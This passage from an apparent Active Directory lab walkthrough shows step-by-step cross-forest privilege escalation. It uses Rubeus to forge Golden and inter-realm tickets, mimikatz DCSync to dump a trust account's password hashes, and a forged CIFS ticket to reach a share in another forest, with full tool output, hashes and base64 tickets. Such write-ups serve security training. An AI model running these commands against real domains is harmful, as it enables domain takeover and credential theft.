- Forge a Golden Ticket to get DA access.
```
PS C:\AD\MyTools> .\Rubeus.exe golden /rc4:4e9815869d2090ccfca61c1fe0d23986 /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /user:Administrator /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (DOLLARCORP)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : 4E9815869D2090CCFCA61C1FE0D23986
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 4E9815869D2090CCFCA61C1FE0D23986
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@dollarcorp.moneycorp.local'

[*] AuthTime       : 8/10/2023 10:08:01 AM
[*] StartTime      : 8/10/2023 10:08:01 AM
[*] EndTime        : 8/10/2023 8:08:01 PM
[*] RenewTill      : 8/17/2023 10:08:01 AM

[*] base64(ticket.kirbi):

      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
      Y29ycC5sb2NhbA==

[+] Ticket successfully imported!
```

- Find the Inter-Realm Trust Key.
```
mimikatz # lsadump::dcsync /user:dcorp\ecorp$
[DC] 'dollarcorp.moneycorp.local' will be the domain
[DC] 'dcorp-dc.dollarcorp.moneycorp.local' will be the DC server
[DC] 'dcorp\ecorp$' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : ecorp$

** SAM ACCOUNT **

SAM Username         : ecorp$
Account Type         : 30000002 ( TRUST_ACCOUNT )
User Account Control : 00000820 ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT )
Account expiration   :
Password last change : 8/4/2023 2:33:09 AM
Object Security ID   : S-1-5-21-719815819-3726368948-3917688648-1112
Object Relative ID   : 1112

Credentials:
  Hash NTLM: 652127203547e42b5b33a68fc49d8e8b
    ntlm- 0: 652127203547e42b5b33a68fc49d8e8b
    ntlm- 1: dc372d448bdbaf4e6777e3f7a814e0cf
    ntlm- 2: 7304e4c6561ee9adbc31ee8e025a7ed7
    ntlm- 3: be6ce1c7d1b98d2c6b7bd8631b44d970
    ntlm- 4: f79531a8d712f35be1ab409fceb32299
    ntlm- 5: f79531a8d712f35be1ab409fceb32299
    ntlm- 6: 4b605882ed903a28faf94dd4b1fe8742
    ntlm- 7: 659e70b56ae451871bf4cce4944df0a6
    ntlm- 8: 54be11f1ee09c5e4978efe3275bce0a3
    ntlm- 9: 14dd7f8b7ec6f2a758452cc5111b90c8
    ntlm-10: 14dd7f8b7ec6f2a758452cc5111b90c8
    ntlm-11: 14dd7f8b7ec6f2a758452cc5111b90c8
    ntlm-12: 84de4279a2971e4947cde39e959d1a92
    ntlm-13: 8e2dc249ebdf947d574b24714b2b1d5c
    ntlm-14: dcb74bd050cc88042ffa453ec56132c2
    ntlm-15: f752bf92d47aad19991988c0f3bcb676
    ntlm-16: 163373571e6c3e09673010fd60accdf0
    ntlm-17: 163373571e6c3e09673010fd60accdf0
    ntlm-18: 3e9e17eb3c8da8bc9f541ec33e3b8f69
    ntlm-19: 92d6ea97dd9aa9ae0b719ad6f463fd2a
    ntlm-20: 92d6ea97dd9aa9ae0b719ad6f463fd2a
    ntlm-21: 8a8d84e972148ba778a0b695e41cde08
    lm  - 0: 77487ea7711a4abaabdb2f0908a58b6d
    lm  - 1: 96f959187728a96bc86f9875105751bb
    lm  - 2: 734e6644cc7fb07244579267b467e95e
    lm  - 3: 0328fb32680c21979aaa1288ce5194e8
    lm  - 4: ce5c35799bfdc0fe8a46ee2baf2bb698
    lm  - 5: fbaa0d74c78f090bc25360afb2cd8cca
    lm  - 6: e4a4491651434cbfebe3da9eb4f3b1b9
    lm  - 7: 413f5ff15afd97dde2e8c25bf8abd4fb
    lm  - 8: bcfea62baf53d26d7b280d45566d222b
    lm  - 9: a7af6a6c04a397e2bd4659dd12bcda4b
    lm  -10: e87f73f0b4093c110c8bed918716f356
    lm  -11: 31ab03f0b930eb93482003ac0e93520e
    lm  -12: aac94c0ff6f409e43b4ce2fa506c9ba6
    lm  -13: 2005d7d27917b74b7b9d3d1c2fe4f80c
    lm  -14: 8ca8ba62b615432482341e74a5487ef2
    lm  -15: f950e352a2ef3bdd5ddbd6f522241843
    lm  -16: b40f40a34f09ee9c9850bbffac388da5
    lm  -17: 80ed0eb70d5f3bea387d77db7b8f6c3c
    lm  -18: 50aaa42f874796ad089b77bc9bdefc26
    lm  -19: 4555b566c30f96dec4b1a112212c874b
    lm  -20: 524dec7898a22cb806a6ce5f18ede52d
    lm  -21: afbfeb7d3cd698e5014c52544296deb2

Supplemental Credentials:
* Primary:Kerberos-Newer-Keys *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgtecorp
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 243d1829c0595b8908f2b5e9c3412f6d1ee85f55f1865d741d4e4e2184be29bf
      aes128_hmac       (4096) : 3d38d1848c732050b89b2dfce6be0b92
      des_cbc_md5       (4096) : 3d917aa7cd2c3894
    OldCredentials
      aes256_hmac       (4096) : 80985ef1b7a9179a58f30a6094b9f35a903f76b488341bbba80bdefaf527d737
      aes128_hmac       (4096) : c2fa27d7657275b3a7a64c41d4e96d6d
      des_cbc_md5       (4096) : 3d917aa7cd2c3894
    OlderCredentials
      aes256_hmac       (4096) : 5b3c3bea5fc2a434147d8f4cec42ac65a24b90d6f6f8b63b9ff16aba99b8877e
      aes128_hmac       (4096) : b37863e5b109dcd98c6429d3b5afa2fe
      des_cbc_md5       (4096) : 4661ec3701c25bd9

* Primary:Kerberos *
    Default Salt : DOLLARCORP.MONEYCORP.LOCALkrbtgtecorp
    Credentials
      des_cbc_md5       : 3d917aa7cd2c3894
    OldCredentials
      des_cbc_md5       : 3d917aa7cd2c3894

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  fe5ef7c85724b415495c0b31b3ea4639
    02  0e34cd8ab77c33b28508f5a2069b905b
    03  d4f6e6441d2a97c41f9c9f314da3495e
    04  fe5ef7c85724b415495c0b31b3ea4639
    05  0e34cd8ab77c33b28508f5a2069b905b
    06  908aefe00b622932da4e39fdea209c6b
    07  fe5ef7c85724b415495c0b31b3ea4639
    08  2705a8e75ebc33bc170ac430806fe663
    09  2705a8e75ebc33bc170ac430806fe663
    10  92ea8adf8e33e8593bdd331cf12961b1
    11  0bce58b0414b65ec1323b88700f3de76
    12  2705a8e75ebc33bc170ac430806fe663
    13  60314a32b5ecc71265d7ecbe974f2dc8
    14  0bce58b0414b65ec1323b88700f3de76
    15  b4114ec4b0c493e848861bd5c69da9f0
    16  b4114ec4b0c493e848861bd5c69da9f0
    17  b7988b7415d3a6a12bdf451b3ce89683
    18  ade3f7c438f5e5859995ce61b23015aa
    19  f227dcea74924ddd459d40d02c3bfb98
    20  5d34ed5fe3b34dc07fed2572ebf49e65
    21  cf772e6b3dc19ecb1749787b38c4f410
    22  cf772e6b3dc19ecb1749787b38c4f410
    23  2138ca048ad0b7af3f6c82d6ac2bbfed
    24  cb24feadcd9042d0a134bd33551f37fd
    25  cb24feadcd9042d0a134bd33551f37fd
    26  13f5e8a6a72a22f53efbbbe4195323a6
    27  02dd6fa4c2a175c5e79c7a5e5016d43d
    28  4bca6a035a4558aaec961bbf425235a5
    29  c0da6582d82dc005a7587afa9141bea9
```

- Forge an Inter-Realm Golden Ticket for the fake user `interealm`.
```
PS C:\AD\MyTools> .\Rubeus.exe golden /rc4:652127203547e42b5b33a68fc49d8e8b /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /service:krbtgt/eurocorp.local /user:interealm /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : DOLLARCORP.MONEYCORP.LOCAL (DOLLARCORP)
[*] SID            : S-1-5-21-719815819-3726368948-3917688648
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : 652127203547E42B5B33A68FC49D8E8B
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 652127203547E42B5B33A68FC49D8E8B
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : dollarcorp.moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'interealm@dollarcorp.moneycorp.local'

[*] AuthTime       : 8/10/2023 11:26:06 AM
[*] StartTime      : 8/10/2023 11:26:06 AM
[*] EndTime        : 8/10/2023 9:26:06 PM
[*] RenewTill      : 8/17/2023 11:26:06 AM

[*] base64(ticket.kirbi):

      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
```

- Request a TGS for `cifs/eurocorp-dc.eurocorp.local`.
```
PS C:\AD\MyTools> .\Rubeus.exe asktgs /service:cifs/eurocorp-dc.eurocorp.local /domain:eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt /ticket: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

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/eurocorp-dc.eurocorp.local'
[*] Using domain controller: eurocorp-dc.eurocorp.local (172.16.15.1)
[+] TGS request successful!
[+] Ticket successfully imported!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  cifs/eurocorp-dc.eurocorp.local
  ServiceRealm             :  EUROCORP.LOCAL
  UserName                 :  interealm
  UserRealm                :  DOLLARCORP.MONEYCORP.LOCAL
  StartTime                :  8/10/2023 11:27:22 AM
  EndTime                  :  8/10/2023 9:26:06 PM
  RenewTill                :  8/17/2023 11:26:06 AM
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  HmTMfivLde4TyHyO8Amrhep57RXXQSSBlrwtt6nw1zs=
```

- Access the shared resources.
```
PS C:\AD\MyTools> dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\


    Directory: \\eurocorp-dc.eurocorp.local\SharedwithDCorp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/15/2022   6:17 AM             29 secret.txt
```